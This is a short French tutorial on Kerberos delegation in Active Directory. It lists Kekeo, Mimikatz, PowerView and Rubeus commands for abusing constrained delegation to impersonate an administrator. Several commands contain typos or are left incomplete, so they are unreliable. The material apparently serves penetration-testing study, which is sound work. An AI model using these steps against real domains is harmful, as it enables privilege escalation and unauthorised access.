
## Qu’est-ce que la délégation Kerberos ?

La délégation Kerberos est un paramètre de délégation qui permet aux applications de demander des informations d’identification d’accès à l’utilisateur final pour accéder aux ressources pour le compte de l’utilisateur d’origine.

Les trois principaux types de délégation que je vais couvrir sont les suivants:
- **Délégation sans contrainte** : tout service peut être utilisé de manière abusive si l’une de ses entrées de délégation est sensible.
- **Délégation contrainte** : les entités contraintes peuvent être abusées si l’une de leurs entrées de délégation est sensible.
- **Délégation contrainte basée sur les ressources (RBCD)** : les entités contraintes basées sur les ressources peuvent être abusées si l’entité elle-même est sensible.

##  Délégation contrainte
La délégation contrainte permet aux administrateurs de configurer les services auxquels un compte utilisateur ou ordinateur peut déléguer et quels protocoles d'authentification peuvent être utilisés

## Exploitation
#### Technique 1
Pour exploiter la délégation contrainte, nous avons besoin de trois choses essentielles :

- Un compte compromis configuré avec une délégation contrainte
- Un compte privilégié cible pour se faire usurper en demandant l'accès au service
- Informations sur la machine hébergeant le service auquel nous aurons accès

Tout d'abord, nous allons voirsi la  délégation contrainte du compte «Admnistrateur» est configurée pour:

```PowerShell
 Get-ADUser Administrateur -Properties msDs-AllowedToDelegateTo | select -ExpandProperty msDs-AllowedToDelegateTo
```

## 
 #### en utilisant Kekeo 
 nous demandons le compte TGT pour le compte
 
```PowerShell
keko # tgt : : ask /user:NameUser /domain:NameDomain /rc4
```

Maintenant que nous avons le TGT, nous exécutons la demande TGS pour le compte que nous voulons imiter pour le service cible que le compte

```PowerShell
keko # tgs : : s4u /tgt:namedufichier.kirbi /user:nom /service:nameservice
```

En revenant à Mimikatz, nous pouvons utiliser Pass the Ticket pour accéder au service

```PowerShell
mimikatz # privilege: : debug
```


#### Technique 2 
Avec Powerview 

```PowerShell
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
```

```PowerShell
Rubeus.exe s4u /user:appsvc /aes256:aaaaaaaaa /impersonateuser:administrator /msdsspn:servicename /domain:namedomain /ptt
```



https://adsecurity.org/?p=1667